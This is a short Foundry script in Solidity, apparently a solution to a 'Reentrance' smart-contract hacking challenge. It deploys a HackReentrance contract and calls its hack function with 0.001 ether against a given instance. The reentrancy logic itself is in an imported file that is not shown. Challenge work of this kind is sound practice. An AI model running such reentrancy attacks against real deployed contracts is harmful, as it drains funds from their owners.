// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Reentrance.sol";

contract ReentranceScript is Script {
    function setUp() public {}

    // 0xafa08c0F601fF3a395390F4613Ebb1F6BD0857Fe
    function run(address instance) public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        Reentrance reentrance = Reentrance(instance);

        vm.startBroadcast(deployerPrivateKey);
        HackReentrance hack = new HackReentrance();
        hack.hack{ value: 0.001 ether }(reentrance);
    }
}
